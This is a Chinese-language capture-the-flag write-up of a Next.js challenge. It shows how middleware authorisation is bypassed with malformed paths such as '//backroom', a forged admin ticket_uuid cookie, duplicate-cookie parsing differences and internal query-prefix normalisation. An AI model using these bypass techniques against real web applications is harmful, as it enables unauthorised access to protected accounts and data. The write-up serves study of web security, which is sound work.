middleware.js如下

这段代码的核心漏洞原理在于：Next.js 的路由匹配机制（**matcher**）与实际控制访问的路径逻辑之间存在“不一致性”。 攻击者可以通过在 URL 中构造特殊字符（如路径穿越或多重斜杠），让中间件误以为请求不需要拦截，从而直接绕过鉴权，访问到敏感页面

这段代码本质上是一段用于防御水平越权漏洞（Horizontal Privilege Escalation）或 IDOR（不安全的直接对象引用，Insecure Direct Object Reference）的基于资源的访问控制（Resource-Based Access Control）逻辑。

从应用安全和后端架构的视角，我们可以将其拆解为以下三个核心执行阶段：

1. 路由匹配与鉴权触发 (Routing & Trigger Condition)

JavaScript

  • 技术解析：这是中间件层面的端点匹配（Endpoint Matching）。系统通过对 HTTP 请求体中的 URI 路径（pathname）进行严格相等（Strict Equality, ===）断言，来决定是否针对该特定端点（/access-card）执行后续的细粒度授权策略

2. 目标资源标识符提取 (Resource Identifier Extraction)

JavaScript

  • 技术解析：系统解析 HTTP GET 请求的查询字符串（Query String），提取出客户端试图访问的目标资源标识符（Resource ID）。在安全语境下，这是一个不可信的用户输入（Untrusted User Input），攻击者可以任意操纵该参数

3. 身份断言与授权校验 (Identity Assertion & Authorization Check)

JavaScript

  • 技术解析：这是核心的鉴权控制平面（Control Plane）逻辑。
    • session.sub 提取自服务端验证过的 JWT（JSON Web Token）的 Payload 中的 **sub**（Subject）声明。这是一个由密码学签名保证完整性的可信身份凭据（Trusted Identity Credential）。
    • 代码通过比对“不可信的资源请求 ID”与“可信的当前会话身份 ID”，来验证当前主体（Subject）是否拥有对该客体（Object）的访问权限。
    • 如果断言失败（即两者不匹配），则调用 deny(request) 抛出未授权异常或执行 HTTP 302 重定向，从而阻断潜在的 IDOR 攻击

漏洞二：重复 Cookie 解析差异拿到第一段 flag

/backroom ： 这是一个基于 Cookie 的鉴权与资源分配端点

middleware 读取 cookie 的逻辑：

在正常的业务逻辑下：

  • expectedTicket 来源于你当前登录的 Session（也就是你低权限账号的原始凭证）。
  • middlewareTicket 来源于你的 Cookie。
  • 正常情况下，两者应该是一模一样的。

但在你的攻击剧本里，情况变了：

为了在最终的 /backroom 拿到 Flag，你必须把 Cookie 里的 ticket_uuid 替换成管理员的 UUID（通过二维码解码拿到的那个）

这时候就会出现致命冲突：

  • middlewareTicket = 管理员的 UUID
  • expectedTicket = 你自己的低权限 UUID

显然，middlewareTicket !== expectedTicket 绝对成立！如果你老老实实地去请求 /backroom，这行代码就会毫不留情地触发 deny(request)，把你踢出去。

破局之法：首尾呼应

既然这行代码一定会拦截你的伪造请求，你要做的就是不让它执行。

这也就是为什么我们在上一轮分析中强调，最后访问 /backroom 时，必须再次使用第一步学到的“路径畸形绕过”技巧（比如访问 /backroom/.. 或者 //backroom）。

  • 靠路径绕过$\rightarrow$ 骗过 matcher 或 pathname 检查，直接跳过这段 Cookie 校验代码。
  • 靠伪造的 Cookie$\rightarrow$ 骗过最终的服务端渲染逻辑（req.cookies.ticket_uuid），让服务端以为你是管理员。

SSR 读取 cookie 的逻辑：

  • 这是一段严格的强制访问控制（Mandatory Access Control）逻辑。系统通过硬编码检查 **id === 1** 来判断权限。在典型的系统架构或 CTF 题设中，**ID: 1**** 通常代表**超级管理员（Superuser / Admin）或系统初始化的第一个特权用户。
  • 执行结果：如果你提供的 UUID 查出来的用户 ID 不是 1，系统将返回 403 Forbidden HTTP 状态码，并渲染“拒绝访问”的 UI

漏洞总结

本题主要利用了三个 Next.js/框架边界差异：

  1. nxtP / nxtI 内部查询参数前缀归一化，导致 middleware 和 SSR 对 id 的理解不一致。
  2. Edge middleware 的 cookie parser 和 Pages Router SSR 的 cookie parser 对重复 cookie 取值顺序不一致。
  3. assetPrefix 下的 data route 变体没有被 middleware matcher 正确覆盖，导致第二个站点首页 SSR 可被未授权访问。
